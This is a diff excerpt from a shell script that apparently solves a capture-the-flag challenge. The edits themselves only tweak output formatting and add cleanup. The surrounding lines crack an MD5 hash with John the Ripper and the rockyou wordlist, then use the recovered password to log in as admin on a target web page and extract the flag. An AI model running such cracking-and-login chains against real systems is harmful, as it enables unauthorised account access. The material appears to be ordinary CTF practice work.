@@ -35,14 +35,16 @@ rm /opt/john/john.pot 2>/dev/null
 /opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt >/dev/null 2>/dev/null
 /opt/john/john --show /work/hash.txt >/dev/null 2>/dev/null
 PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
-echo "Password cracked : $PASSWORD"
+echo "--> Password cracked : $PASSWORD"
 
 # Initiate php session
 echo "5 - AUTHENTICATE ON WEBSITE"
 curl -s -X GET "http://$target_ip:81/login.php" -c "/work/cookie-cf.txt" -L > /dev/null
 PHPSESSID=$(grep PHPSESSID "/work/cookie-cf.txt" | awk '{print $7}')
-echo "Session initiated : $PHPSESSID"
+echo "--> Session initiated : $PHPSESSID"
 
 # Authenticate
 curl -s -X POST "http://$target_ip:81/login.php" -b /work/cookie-cf.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/cf-flag.html
-echo "Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/cf-flag.html)"
+echo "--> Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/cf-flag.html)"
+
+rm -f /work/cookie-cf.txt
